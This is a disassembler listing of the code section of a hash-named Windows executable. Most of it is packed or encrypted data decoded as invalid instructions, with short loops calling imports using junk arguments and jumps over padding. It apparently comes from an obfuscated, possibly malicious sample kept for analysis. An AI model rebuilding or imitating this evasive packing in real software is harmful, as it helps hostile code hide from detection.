
f2298d7641e0a7e2449c85305665b2a44a75cd68a1fdbf031bab1acd92239b24.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc98
  40100b:	jmp    0x4011ce
  401010:	inc    DWORD PTR ss:[esi]
  401013:	shl    BYTE PTR [edi-0x1ca60faf],1
  401019:	fs cmp eax,0x160c508c
  40101f:	ret    
  401020:	jle    0x4010a0
  401022:	jle    0x4010a2
  401024:	cwde   
  401025:	jg     0x4010a5
  401027:	jle    0x400ff7
  401029:	xlat   BYTE PTR ds:[ebx]
  40102a:	cmp    eax,0xcfd339d5
  40102f:	ror    esi,1
  401031:	pop    es
  401032:	add    al,0x3
  401034:	movq   QWORD PTR [eax],mm0
  401037:	rdpmc  
  401039:	xadd   BYTE PTR [eax],bl
  40103c:	(bad)  
  40103d:	adc    BYTE PTR [edi],bl
  40103f:	mov    ecx,0xddb70058
  401044:	push   cs
  401045:	out    dx,eax
  401046:	mov    ebp,0x8e03d6db
  40104b:	es mov esi,0x1541a2f4
  401051:	lods   eax,DWORD PTR ds:[esi]
  401052:	fiadd  WORD PTR [esi+0x1f]
  401055:	data16 in al,dx
  401057:	outs   dx,DWORD PTR ds:[esi]
  401058:	or     edx,DWORD PTR [ecx]
  40105a:	pushf  
  40105b:	js     0x401033
  40105d:	inc    eax
  40105e:	stos   BYTE PTR es:[edi],al
  40105f:	push   ebx
  401060:	sub    eax,0xad3cc4d1
  401065:	mov    bh,BYTE PTR [ebx-0x3b]
  401068:	stos   DWORD PTR es:[edi],eax
  401069:	push   es
  40106a:	(bad)  
  40106b:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  401071:	jmp    0x4010a3
  401073:	mov    ebp,ecx
  401075:	dec    edi
  401076:	out    0xa6,al
  401078:	inc    ecx
  401079:	call   DWORD PTR [edi-0x2556f868]
  40107f:	mov    ebp,0x5536ed4d
  401084:	and    esi,DWORD PTR [edx-0x43619116]
  40108a:	jnp    0x40109d
  40108c:	ret    
  40108d:	xchg   edx,eax
  40108e:	and    esp,edx
  401090:	jmp    0x4010f0
  401092:	ret    0xb8e4
  401095:	lock jmp 0xd765:0x74cf3192
  40109d:	and    ch,cl
  40109f:	add    bl,cl
  4010a1:	adc    DWORD PTR [ecx-0x5a],edx
  4010a4:	xor    eax,0x78616f03
  4010a9:	or     BYTE PTR [ecx],dh
  4010ab:	fisttp QWORD PTR [esi+0x7f752854]
  4010b1:	(bad)
  4010b6:	or     ebx,DWORD PTR [ebx+0x55]
  4010b9:	fst    st(6)
  4010bb:	or     ebx,edx
  4010bd:	pop    esp
  4010be:	fstp   DWORD PTR [ecx]
  4010c0:	jno    0x401060
  4010c2:	inc    esi
  4010c3:	dec    ebx
  4010c4:	aaa    
  4010c5:	adc    eax,0x1a29772b
  4010ca:	sar    DWORD PTR [esi],cl
  4010cc:	dec    edi
  4010cd:	call   0x2704b59f
  4010d2:	and    BYTE PTR [esi],dl
  4010d4:	dec    edi
  4010d5:	add    al,0x1d
  4010d7:	xor    eax,0xae60f127
  4010dc:	jnp    0x4010c9
  4010de:	xchg   BYTE PTR [edi+0x37b07b8b],bl
  4010e4:	out    dx,eax
  4010e5:	jg     0x4010e1
  4010e7:	inc    edi
  4010e8:	test   al,0xf0
  4010ea:	rol    DWORD PTR [esi+0x50],cl
  4010ed:	mov    eax,cs
  4010ef:	mov    ecx,DWORD PTR [ebp+0x20]
  4010f2:	pop    edx
  4010f3:	in     eax,0x74
  4010f5:	fwait
  4010f6:	int3   
  4010f7:	mov    dh,0x72
  4010f9:	retf   
  4010fa:	fldcw  WORD PTR [ecx+eiz*4]
  4010fd:	in     eax,dx
  4010fe:	sbb    eax,0xd889a631
  401103:	push   ds
  401104:	push   ebx
  401105:	mov    ah,0xb0
  401107:	xchg   edx,eax
  401108:	inc    ecx
  401109:	popf   
  40110a:	xlat   BYTE PTR ds:[ebx]
  40110b:	pop    eax
  40110c:	cmc    
  40110d:	(bad)  [edx-0x6ca6696d]
  401113:	dec    ebx
  401114:	mov    cl,0xdf
  401116:	pop    esi
  401117:	jle    0x40109d
  401119:	xchg   edi,eax
  40111a:	xor    al,0x76
  40111c:	or     al,0x49
  40111e:	or     ebp,DWORD PTR [ebx]
  401120:	sbb    ebx,edx
  401122:	cmp    BYTE PTR [ebx],ah
  401124:	popf   
  401125:	inc    esp
  401126:	sub    ebp,DWORD PTR [ebp+0x5a83112e]
  40112c:	inc    edi
  40112d:	fxch   st(5)
  40112f:	sub    ebx,DWORD PTR [eax+0x71]
  401132:	(bad)  
  401133:	fisub  WORD PTR [eax]
  401135:	popa   
  401136:	or     eax,0x81077384
  40113b:	loopne 0x40119b
  40113d:	popa   
  40113e:	enter  0x56a3,0x70
  401142:	add    eax,0x34f6eb1
  401147:	ss loope 0x4010ff
  40114a:	sar    edi,0x5a
  40114d:	ret    0x57dd
  401150:	cli    
  401151:	or     BYTE PTR [edx+0x46],al
  401154:	bound  esp,QWORD PTR [eax]
  401156:	push   0xffffff86
  401158:	ret    
  401159:	adc    eax,0x4f523cd8
  40115e:	loopne 0x4011cb
  401160:	push   eax
  401161:	xchg   BYTE PTR [eax+0xe41d6a6],bh
  401167:	stos   BYTE PTR es:[edi],al
  401168:	jmp    FWORD PTR [eax+0x32f50c5d]
  40116e:	(bad)  
  40116f:	mov    edx,0x81007ab5
  401174:	pop    esp
  401175:	sub    dl,BYTE PTR [edx-0x44]
  401178:	adc    bh,bl
  40117a:	dec    esp
  40117b:	sub    BYTE PTR [esi+0x2a],bl
  40117e:	outs   dx,DWORD PTR ds:[esi]
  40117f:	push   ds
  401180:	not    DWORD PTR [ecx+0x58]
  401183:	pop    ebx
  401184:	ds adc al,0x8e
  401187:	retf   
  401188:	jbe    0x401111
  40118a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40118b:	inc    ebp
  40118c:	ret    
  40118d:	loopne 0x401138
  40118f:	ja     0x40112f
  401191:	hlt    
  401192:	dec    ebp
  401193:	sub    BYTE PTR [eax],ah
  401195:	mov    edi,0x4f920ed6
  40119a:	retf   
  40119b:	mov    BYTE PTR [edx-0x766c9da8],0x2d
  4011a2:	icebp  
  4011a3:	pop    esi
  4011a4:	mov    al,BYTE PTR [ebx-0x9a61210]
  4011aa:	imul   ebx,DWORD PTR [ecx+0x6f],0xcc31c2bd
  4011b1:	jp     0x4011f6
  4011b3:	sahf   
  4011b4:	dec    ebx
  4011b5:	adc    ah,dl
  4011b7:	mov    ds:0xda84b6c6,al
  4011bc:	pop    eax
  4011bd:	sub    eax,0xa74fecbb
  4011c2:	imul   ecx,DWORD PTR [esi],0x731b21cf
  4011c8:	adc    bl,dh
  4011ca:	in     al,0xdf
  4011cc:	adc    esp,esi
  4011ce:	mov    DWORD PTR [ebp-0x20],eax
  4011d1:	mov    ecx,0x5d3a
  4011d6:	mov    ecx,DWORD PTR [ebp-0x20]
  4011d9:	mov    DWORD PTR [ebp-0x24],0x4ec1
  4011e0:	cmp    ecx,eax
  4011e2:	jne    0x4020c2
  4011e8:	sbb    ecx,0xfa8
  4011ee:	mov    ax,WORD PTR [ebp-0x24]
  4011f2:	and    DWORD PTR ds:0x4302d5,0x0
  4011fc:	mov    ecx,DWORD PTR ds:0x4302d5
  401202:	inc    ecx
  401203:	mov    DWORD PTR ds:0x4302d5,ecx
  401209:	cmp    DWORD PTR ds:0x4302d5,0xb
  401210:	jne    0x401248
  401216:	push   0x25a9
  40121b:	push   0x3372
  401220:	push   0x5bb7
  401225:	push   DWORD PTR [ebp-0x1c]
  401228:	push   0x6ec1
  40122d:	push   DWORD PTR [ebp-0x28]
  401230:	push   0x3d62
  401235:	push   0x5689
  40123a:	push   DWORD PTR [ebp-0x28]
  40123d:	push   0x7975
  401242:	call   DWORD PTR ds:0x42ea8b
  401248:	cmp    DWORD PTR ds:0x4302d5,0xa
  40124f:	jne    0x401262
  401255:	mov    ecx,DWORD PTR ds:0x4302d5
  40125b:	inc    ecx
  40125c:	mov    DWORD PTR ds:0x4302d5,ecx
  401262:	cmp    DWORD PTR ds:0x4302d5,0x12
  401269:	jb     0x4011fc
  40126f:	mov    DWORD PTR ds:0x4302cd,0x1e
  401279:	cmp    DWORD PTR ds:0x4302cd,0x0
  401280:	je     0x401471
  401286:	cmp    DWORD PTR ds:0x4302cd,0x2d
  40128d:	jne    0x40129c
  401293:	push   DWORD PTR [ebp-0x20]
  401296:	call   DWORD PTR ds:0x42e827
  40129c:	mov    ecx,DWORD PTR ds:0x4302cd
  4012a2:	dec    ecx
  4012a3:	mov    DWORD PTR ds:0x4302cd,ecx
  4012a9:	jmp    0x401279
  4012ae:	jmp    0x401471
  4012b3:	out    0xe8,al
  4012b5:	sub    al,BYTE PTR [ebx]
  4012b7:	xor    cl,al
  4012b9:	imul   ecx
  4012bb:	and    BYTE PTR [ecx],bh
  4012bd:	adc    esi,DWORD PTR [ebx-0x5dab8646]
  4012c3:	cwde   
  4012c4:	jg     0x401344
  4012c6:	jle    0x401260
  4012c8:	jg     0x401348
  4012ca:	jle    0x401289
  4012cc:	mov    ebx,DWORD PTR [esi-0x32]
  4012cf:	mov    WORD PTR [ecx+eax*1-0x69],ss
  4012d3:	jae    0x4012bf
  4012d5:	sti    
  4012d6:	xchg   edx,eax
  4012d7:	xor    dl,bh
  4012d9:	dec    edi
  4012da:	jecxz  0x4012e8
  4012dc:	aas    
  4012dd:	and    al,bl
  4012df:	scas   al,BYTE PTR es:[edi]
  4012e0:	call   0xa505c78e
  4012e5:	xor    ah,BYTE PTR [edi+0x36]
  4012e8:	push   ds
  4012e9:	cmp    ebx,DWORD PTR [ecx-0x4db4d15f]
  4012ef:	pop    ss
  4012f0:	mov    edi,esi
  4012f2:	adc    al,0x66
  4012f4:	jbe    0x4012af
  4012f6:	mov    ebx,0x5d1f165e
  4012fb:	pop    ebp
  4012fc:	loope  0x401288
  4012fe:	fs add al,0x39
  401301:	neg    BYTE PTR [ecx-0x702b56a5]
  401307:	les    eax,FWORD PTR [ebx+0x72]
  40130a:	pop    esi
  40130b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40130c:	and    bl,ch
  40130e:	bound  ebx,QWORD PTR [ecx-0x31]
  401311:	scas   eax,DWORD PTR es:[edi]
  401312:	xchg   ebx,eax
  401313:	loope  0x4012f7
  401315:	push   esi
  401316:	fimul  WORD PTR [esi+eax*1-0x58]
  40131a:	test   BYTE PTR [ecx+eiz*4-0x13],ah
  40131e:	mov    dl,0x31
  401320:	mov    ebx,0xebff651e
  401325:	loopne 0x40139c
  401327:	out    0xfb,eax
  401329:	cmp    ch,BYTE PTR [ebp+edx*2-0x5d5562c9]
  401330:	mov    ebx,0x38f3bea5
  401335:	daa    
  401336:	sub    edx,DWORD PTR [ecx+0x1b360931]
  40133c:	fnsave [eax]
  40133e:	ror    BYTE PTR [ebx],1
  401340:	sub    eax,0xa3e888bc
  401345:	call   0x61667758
  40134a:	jns    0x401382
  40134c:	jle    0x40135d
  40134e:	je     0x4012fe
  401350:	dec    ecx
  401351:	cli    
  401352:	xchg   ecx,eax
  401353:	jg     0x4013b8
  401355:	adc    ebp,esp
  401357:	add    ebp,edx
  401359:	sub    ebx,DWORD PTR [esi]
  40135b:	push   0xb14e02e6
  401360:	mov    al,0xfe
  401362:	(bad)  
  401363:	hlt    
  401364:	ror    BYTE PTR [edx-0x451bc49d],0xd8
  40136b:	scas   eax,DWORD PTR es:[edi]
  40136c:	and    al,0x53
  40136e:	int    0x96
  401370:	retf   0x5e80
  401373:	jns    0x401349
  401375:	cdq    
  401376:	scas   eax,DWORD PTR es:[edi]
  401377:	test   al,0x7b
  401379:	jp     0x401359
  40137b:	(bad)
  40137f:	imul   edi,DWORD PTR [edx],0xffffffdb
  401382:	sbb    ebx,DWORD PTR [ebx+0x15fcd094]
  401388:	and    BYTE PTR [bx+0x1a60],0xf5
  40138e:	dec    ebp
  40138f:	aam    0x3b
  401391:	cmp    BYTE PTR [ebx-0x7c],bh
  401394:	xor    BYTE PTR [ecx],bh
  401396:	mov    ds:0xe56610d0,al
  40139b:	or     eax,0xe345f5ad
  4013a0:	lahf   
  4013a1:	call   0x1892668d
  4013a6:	loop   0x401411
  4013a8:	aas    
  4013a9:	ins    BYTE PTR es:[edi],dx
  4013aa:	jnp    0x401390
  4013ac:	rcr    ebp,0x42
  4013af:	or     BYTE PTR [edx-0xb],0x35
  4013b3:	jle    0x4013b8
  4013b5:	stos   DWORD PTR es:[edi],eax
  4013b6:	add    edi,DWORD PTR ds:0xe3472184
  4013bc:	test   BYTE PTR [ecx],dh
  4013be:	jbe    0x4013c5
  4013c0:	or     eax,0x546aaa60
  4013c5:	add    eax,0x355e15e8
  4013ca:	xor    dh,BYTE PTR [edi-0x3fe8e65]
  4013d0:	mov    ecx,0xa76260
  4013d5:	add    al,0x53
  4013d7:	or     dl,BYTE PTR [esi]
  4013d9:	mov    bl,0xd7
  4013db:	push   edx
  4013dc:	inc    esi
  4013dd:	mov    eax,ds:0x6908308c
  4013e2:	aam    0x4a
  4013e4:	mov    cl,0x22
  4013e6:	sbb    esp,DWORD PTR [ecx+0x23d7475f]
  4013ec:	or     BYTE PTR [esi],cl
  4013ee:	mov    BYTE PTR [ebp-0x17],al
  4013f1:	and    eax,0xf91cb0c6
  4013f6:	sub    al,0x5b
  4013f8:	mov    ecx,0xf83aa490
  4013fd:	jmp    0xa2ce:0xc9c4f120
  401404:	mov    edi,0x87880888
  401409:	fimul  DWORD PTR [esi-0x3d32e578]
  40140f:	jg     0x40141a
  401411:	mov    ebx,0x49e7f6bd
  401416:	adc    eax,eax
  401418:	outs   dx,DWORD PTR ds:[esi]
  401419:	repnz mov cl,0x32
  40141c:	lea    ebx,[eax]
  40141e:	outs   dx,DWORD PTR ds:[esi]
  40141f:	pop    ebp
  401420:	(bad)  
  401422:	mov    ebx,0xdf73cab
  401427:	pop    edi
  401428:	inc    edx
  401429:	mov    edi,0x192945e1
  40142e:	test   al,0x9
  401430:	cmp    DWORD PTR [ecx-0x4061a238],ecx
  401436:	mov    edx,0x4bc8e75
  40143b:	jae    0x4013d8
  40143d:	sbb    edi,0xba3e4ec8
  401443:	xchg   edi,eax
  401444:	jno    0x4014ae
  401446:	push   ebp
  401447:	pop    eax
  401448:	jne    0x4013cd
  40144a:	add    al,ah
  40144c:	cs aas 
  40144e:	jp     0x401411
  401450:	rol    DWORD PTR [edi+0x43],1
  401453:	dec    ebp
  401454:	fisub  DWORD PTR [ecx-0x9540f0e]
  40145a:	lahf   
  40145b:	xchg   ecx,eax
  40145c:	popa   
  40145d:	out    dx,eax
  40145e:	stc    
  40145f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401460:	mov    ds:0x41259f55,eax
  401465:	cmp    ah,ah
  401467:	dec    edx
  401468:	cld    
  401469:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40146a:	sub    DWORD PTR [eax-0x29a77cb1],esp
  401470:	ins    DWORD PTR es:[edi],dx
  401471:	push   esi
  401472:	mov    ecx,0x8a3c
  401477:	adc    DWORD PTR ds:0x42ec5b,0x2f3d
  401481:	xor    ax,cx
  401484:	movzx  esi,WORD PTR ds:0x4302b9
  40148b:	or     DWORD PTR ds:0x43036b,esi
  401491:	mov    ecx,DWORD PTR [ebp+0x8]
  401494:	jmp    0x401657
  401499:	adc    eax,0x716ff192
  40149e:	ins    DWORD PTR es:[edi],dx
  40149f:	xchg   ecx,eax
  4014a0:	jo     0x40144d
  4014a2:	or     eax,0x36850fff
  4014a7:	repnz arpl dx,ax
  4014aa:	jge    0x40152a
  4014ac:	jle    0x401446
  4014ae:	jg     0x40152e
  4014b0:	jle    0x4014aa
  4014b2:	push   esp
  4014b3:	in     eax,0xef
  4014b5:	call   0xc023:0x272ef1dd
  4014bc:	test   DWORD PTR [ecx+0x724a6a3b],edi
  4014c2:	ins    DWORD PTR es:[edi],dx
  4014c3:	or     dl,BYTE PTR [eax+0x26a47c44]
  4014c9:	xor    ah,bl
  4014cb:	xchg   ebx,eax
  4014cc:	std    
  4014cd:	mov    ss,esp
  4014cf:	fcmovb st,st(6)
  4014d1:	loope  0x401524
  4014d3:	shl    DWORD PTR [eax-0x1ef1a0bf],0xef
  4014da:	dec    eax
  4014db:	in     al,dx
  4014dc:	mov    BYTE PTR [edi+0x70],al
  4014df:	push   ebx
  4014e0:	cmp    eax,0xeebc9df8
  4014e5:	aad    0x48
  4014e7:	inc    eax
  4014e8:	xchg   DWORD PTR [edi],edx
  4014ea:	sbb    BYTE PTR [edx+0xa],0xf
  4014ee:	test   DWORD PTR [eax],0x77467f49
  4014f4:	pop    es
  4014f5:	pop    ebp
  4014f6:	retf   
  4014f7:	shl    BYTE PTR [ebx+ebx*1],cl
  4014fa:	mov    ds:0xdad09fb,eax
  4014ff:	dec    esp
  401500:	pop    ebp
  401501:	mov    ds:0x5901e631,al
  401507:	jle    0x401568
  401509:	pop    ebp
  40150a:	jg     0x4014fb
  40150c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40150d:	in     eax,dx
  40150e:	pop    ebp
  40150f:	neg    DWORD PTR [eax]
  401511:	inc    esi
  401512:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401513:	stc    
  401514:	pop    ss
  401515:	xchg   DWORD PTR [eax+ebx*4+0x68],ebx
  401519:	inc    ebp
  40151a:	(bad)  
  40151b:	ss cmp eax,0x65303648
  401521:	or     ebx,DWORD PTR [ebp+0x29869a12]
  401527:	pop    ebp
  401528:	clc    
  401529:	xor    al,0xcd
  40152b:	rcl    DWORD PTR [edx-0xae42c9c],0x62
  401532:	(bad)  
  401533:	sub    dx,WORD PTR [ebx+0x413d6c7e]
  40153a:	mov    esi,0xed4f4c1
  40153f:	sub    BYTE PTR [ebp-0x2a2a76bf],al
  401545:	jge    0x4014ce
  401547:	cmp    eax,0xb4d7647c
  40154c:	int3   
  40154d:	ss dec eax
  40154f:	dec    edx
  401550:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401551:	lea    esi,ds:0x1261bb99
  401557:	aad    0xa3
  401559:	loop   0x4015bf
  40155b:	push   cs
  40155c:	ins    BYTE PTR es:[edi],dx
  40155d:	and    ebp,DWORD PTR [esi]
  40155f:	shl    edi,1
  401561:	pop    edi
  401562:	xlat   BYTE PTR ds:[ebx]
  401563:	hlt    
  401564:	gs push esp
  401566:	es pop ebx
  401568:	lock inc esi
  40156a:	dec    ebp
  40156b:	dec    edi
  40156c:	and    dh,BYTE PTR [edi+0x75]
  40156f:	(bad)  
  401570:	fmulp  st(0),st
  401572:	mov    ah,0xe4
  401574:	pop    es
  401575:	ret    0xb41d
  401578:	mov    bl,0xe1
  40157a:	inc    ebp
  40157b:	repnz popa 
  40157d:	int    0xf1
  40157f:	std    
  401580:	ja     0x40157e
  401582:	frstor ds:0xe436f327
  401588:	call   0x1e88fdf9
  40158d:	pop    esi
  40158e:	call   0x8970:0x214c7cef
  401595:	sbb    eax,DWORD PTR [edi+0x3d412cbf]
  40159b:	mov    eax,edx
  40159d:	and    al,0x69
  40159f:	fld    DWORD PTR [esi]
  4015a1:	sbb    DWORD PTR [esi+0x39f5ba98],esp
  4015a7:	pop    ecx
  4015a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015a9:	mov    bl,0xd2
  4015ab:	into   
  4015ac:	xchg   esp,eax
  4015ad:	xchg   esi,eax
  4015ae:	(bad)  
  4015af:	gs xchg ebx,eax
  4015b1:	scas   al,BYTE PTR es:[edi]
  4015b2:	sub    bh,BYTE PTR [eax]
  4015b4:	or     BYTE PTR [ebx+0x23],0x34
  4015b8:	mov    ds:0x2000c552,eax
  4015bd:	pop    eax
  4015be:	mov    ebx,0x1e2357b3
  4015c3:	iret   
  4015c4:	loope  0x401626
  4015c6:	out    dx,al
  4015c7:	fs xchg esi,eax
  4015c9:	int3   
  4015ca:	add    bh,BYTE PTR [ecx-0x46]
  4015cd:	sbb    DWORD PTR [ebp+esi*2-0xa],ecx
  4015d1:	js     0x40157d
  4015d3:	jg     0x401620
  4015d5:	sub    eax,DWORD PTR [edi]
  4015d7:	(bad)  
  4015d8:	fucomp st(5)
  4015da:	fstp   TBYTE PTR [eax-0x73]
  4015dd:	dec    ebp
  4015de:	jl     0x40164f
  4015e0:	xor    eax,0x9bf241e
  4015e5:	or     dl,BYTE PTR [eax+0x1e]
  4015e8:	or     ah,bl
  4015ea:	pop    es
  4015eb:	or     al,0x84
  4015ed:	sub    al,0xe4
  4015ef:	ja     0x401659
  4015f1:	mov    al,ds:0xe465e959
  4015f6:	cs push esi
  4015f8:	lds    eax,FWORD PTR [ecx]
  4015fa:	inc    edi
  4015fb:	xchg   esi,eax
  4015fd:	jae    0x4015ce
  4015ff:	popf   
  401600:	sub    BYTE PTR [eax+0xfbb0b20],bl
  401606:	adc    al,0xc6
  401608:	mov    esp,0xaeb0c6fc
  40160d:	xor    ecx,ecx
  40160f:	adc    al,0x74
  401611:	mov    DWORD PTR [eax-0x68],eax
  401614:	xor    BYTE PTR [ebx+0x43b5cc80],ah
  40161a:	popa   
  40161b:	dec    edx
  40161c:	(bad)  
  40161d:	sbb    BYTE PTR [eax+0x5f],al
  401620:	ja     0x4015b8
  401622:	and    dl,bh
  401624:	cmp    edi,DWORD PTR [edx]
  401626:	lock ror al,cl
  401629:	clc    
  40162a:	shl    DWORD PTR [esi],1
  40162c:	addr16 cdq 
  40162e:	cdq    
  40162f:	shl    ebx,1
  401631:	or     al,0xeb
  401633:	or     edx,DWORD PTR [ecx-0x20ad23f4]
  401639:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40163a:	sbb    ebp,DWORD PTR gs:[ebx]
  40163d:	(bad)  [ecx-0x2f]
  401640:	outs   dx,BYTE PTR ds:[esi]
  401641:	xor    eax,0x424046c5
  401646:	and    eax,0xb39c5d49
  40164b:	xor    eax,esp
  40164d:	cdq    
  40164e:	dec    edx
  40164f:	jp     0x401622
  401651:	aaa    
  401652:	sti    
  401653:	sahf   
  401654:	repz adc esp,DWORD PTR [eax+0x57]
  401658:	and    esi,edi
  40165a:	jmp    0x40181d
  40165f:	push   cs
  401660:	and    BYTE PTR [edi],dh
  401662:	pop    ebp
  401663:	xor    DWORD PTR [ecx+0x54],ebp
  401666:	jno    0x4016b3
  401668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401669:	cmp    BYTE PTR [edi],bl
  40166b:	(bad)  
  40166c:	loopne 0x4015f4
  40166e:	jecxz  0x4016dc
  401670:	jp     0x4016f0
  401672:	jle    0x40160c
  401674:	jg     0x4016f4
  401676:	jle    0x401683
  401678:	and    eax,0x23ef21e1
  40167d:	mov    esp,DWORD PTR [edi+0x37a3ed9a]
  401683:	daa    
  401684:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401685:	retf   0xc268
  401688:	invd   
  40168a:	lock lods eax,DWORD PTR ds:[esi]
  40168c:	pop    ebx
  40168d:	fidiv  DWORD PTR [ebx-0xb]
  401690:	xchg   edx,eax
  401691:	cmp    esi,DWORD PTR [ecx-0x71f9d49c]
  401697:	push   0xebef42b8
  40169c:	mov    edi,fs
  40169e:	push   esp
  40169f:	cmp    al,0x8
  4016a1:	repnz mov edx,0xaec111db
  4016a7:	sbb    DWORD PTR [edi-0x2de9df17],edi
  4016ad:	aas    
  4016ae:	test   eax,0x96a42b4c
  4016b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016b4:	lds    edx,FWORD PTR [ebp+0x1465065c]
  4016ba:	imul   esi,DWORD PTR [edx+eiz*4+0x4],0x46102beb
  4016c2:	outs   dx,BYTE PTR ds:[esi]
  4016c3:	jmp    0x5ba74451
  4016c8:	iret   
  4016c9:	cmp    esp,DWORD PTR [eax+0x39]
  4016cc:	aad    0xf9
  4016ce:	iret   
  4016cf:	outs   dx,DWORD PTR ds:[esi]
  4016d0:	test   BYTE PTR [edx],bh
  4016d2:	loopne 0x4016e0
  4016d4:	bound  esp,QWORD PTR [esi-0x4b]
  4016d7:	add    al,0xbf
  4016d9:	fiadd  WORD PTR [ecx-0x2ade501b]
  4016df:	gs rcl bh,0xd5
  4016e3:	repz and DWORD PTR [ebp-0x7b],ebx
  4016e7:	pop    ecx
  4016e8:	dec    esp
  4016e9:	dec    eax
  4016ea:	fwait
  4016eb:	pop    es
  4016ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016ed:	mov    ds:0x98436715,eax
  4016f2:	inc    ebx
  4016f3:	cmp    bh,BYTE PTR [esp+edi*8+0x36]
  4016f7:	addr16 xchg ebx,eax
  4016f9:	jmp    0xd08aba0b
  4016fe:	mov    ah,0x9b
  401700:	test   DWORD PTR [esi+0x6e],esp
  401703:	inc    eax
  401704:	loop   0x4016bc
  401706:	jb     0x401787
  401708:	xor    dh,BYTE PTR [ebx-0x4c2a13ed]
  40170e:	cwde   
  40170f:	jge    0x4016fa
  401711:	mov    esp,0x671d6053
  401716:	scas   eax,DWORD PTR es:[edi]
  401717:	push   edx
  401718:	fistp  QWORD PTR [ebp+ecx*4-0x64b50356]
  40171f:	mov    esp,0xc0d2e2f9
  401724:	inc    esp
  401725:	add    cl,bl
  401727:	xchg   ebx,eax
  401728:	(bad)  
  401729:	xchg   ecx,eax
  40172a:	inc    ecx
  40172b:	xlat   BYTE PTR ds:[ebx]
  40172c:	pop    ecx
  40172d:	mov    eax,ds:0x6c07cd17
  401732:	rcl    DWORD PTR [ebp+esi*8+0x56613b07],0x4b
  40173a:	cwde   
  40173b:	cmp    DWORD PTR [esi],0xffffff94
  40173e:	and    BYTE PTR [ebp+0x8],0x1d
  401742:	sub    al,0xcf
  401744:	out    dx,eax
  401745:	mov    BYTE PTR [ebp-0x23],dh
  401748:	out    0xe1,eax
  40174a:	xor    BYTE PTR [ecx+ebp*1+0x7340b91a],bl
  401751:	jnp    0x4016dd
  401753:	xor    eax,0xdb5d85e2
  401758:	dec    esp
  401759:	mov    esi,0xb93b47c6
  40175e:	and    ch,BYTE PTR [edi-0x6]
  401761:	adc    DWORD PTR [ecx-0x46872dc6],esp
  401767:	adc    ecx,edx
  401769:	jp     0x4017d9
  40176b:	(bad)  
  40176c:	pop    ebx
  40176e:	retf   0x52b3
  401771:	xor    ebp,DWORD PTR [ebp+0x37795a7a]
  401777:	sbb    bl,ch
  401779:	vmread DWORD PTR [esp+ebp*4+0x51],ecx
  40177e:	fidiv  DWORD PTR [edx-0x53]
  401781:	mov    ebp,0x8fd4ef7d
  401786:	pop    eax
  401787:	push   ss
  401788:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401789:	cmp    al,0xed
  40178b:	in     al,0x9b
  40178d:	mov    BYTE PTR [edx],cl
  40178f:	mov    ?,WORD PTR [ebp-0x56]
  401792:	dec    esp
  401793:	hlt    
  401794:	add    eax,0x55b69187
  401799:	mov    dl,0x4c
  40179b:	xchg   BYTE PTR [ebx+0x43],ah
  40179e:	shr    BYTE PTR [ebx-0x14],cl
  4017a1:	js     0x401770
  4017a3:	(bad)  
  4017a4:	test   DWORD PTR [eax-0x59],0x55229813
  4017ab:	sbb    BYTE PTR [eax+0x78],0x99
  4017af:	ror    DWORD PTR [edi+ebp*4-0x51],1
  4017b3:	popf   
  4017b4:	dec    eax
  4017b5:	xchg   esp,eax
  4017b6:	cmp    DWORD PTR [eax-0x65d1d111],esp
  4017bc:	pusha  
  4017bd:	sbb    edi,DWORD PTR [esi-0x23]
  4017c0:	imul   esp,esi,0x669f15ef
  4017c6:	outs   dx,DWORD PTR ds:[esi]
  4017c7:	in     eax,dx
  4017c8:	add    esp,DWORD PTR [ecx+0x5d]
  4017cb:	test   al,0xc2
  4017cd:	lds    ecx,FWORD PTR [ecx]
  4017cf:	out    0x70,al
  4017d1:	jb     0x4017f2
  4017d3:	cmp    al,0x37
  4017d5:	dec    ebp
  4017d6:	jmp    0xb630:0x17aa8da1
  4017dd:	xchg   ecx,eax
  4017de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017df:	clc    
  4017e0:	push   eax
  4017e1:	jno    0x4017d3
  4017e3:	jle    0x401825
  4017e5:	jmp    0xd696:0xe0c1ff6e
  4017ec:	sbb    BYTE PTR [eax+0xe],ah
  4017ef:	cmp    bh,BYTE PTR [esi+esi*4+0x40]
  4017f3:	mov    bh,0x89
  4017f5:	call   0xb861:0x342acb54
  4017fc:	lods   al,BYTE PTR ds:[esi]
  4017fd:	fwait
  4017fe:	push   esp
  4017ff:	test   al,0x6
  401801:	xchg   ebx,eax
  401802:	retf   0x5b8e
  401805:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401806:	sbb    cl,BYTE PTR [ebx-0xcbc296d]
  40180c:	inc    esp
  40180d:	pop    ebx
  40180e:	idiv   BYTE PTR [edi-0x58]
  401811:	dec    eax
  401812:	jne    0x74407292
  401818:	repz in al,dx
  40181a:	je     0x401814
  40181c:	mov    DWORD PTR [edi+0x3b02],edi
  401822:	add    ax,di
  401825:	mov    DWORD PTR ds:0x4302d5,0x60d8
  40182f:	movzx  eax,ax
  401832:	and    DWORD PTR ds:0x4302d9,0x0
  40183c:	mov    esi,DWORD PTR ds:0x4302d9
  401842:	inc    esi
  401843:	mov    DWORD PTR ds:0x4302d9,esi
  401849:	cmp    DWORD PTR ds:0x4302d9,0x1d
  401850:	jne    0x401863
  401856:	push   0x0
  401858:	push   0x21fd
  40185d:	call   DWORD PTR ds:0x42e913
  401863:	cmp    DWORD PTR ds:0x4302d9,0x10
  40186a:	jb     0x40183c
  401870:	sbb    esi,0x67dd
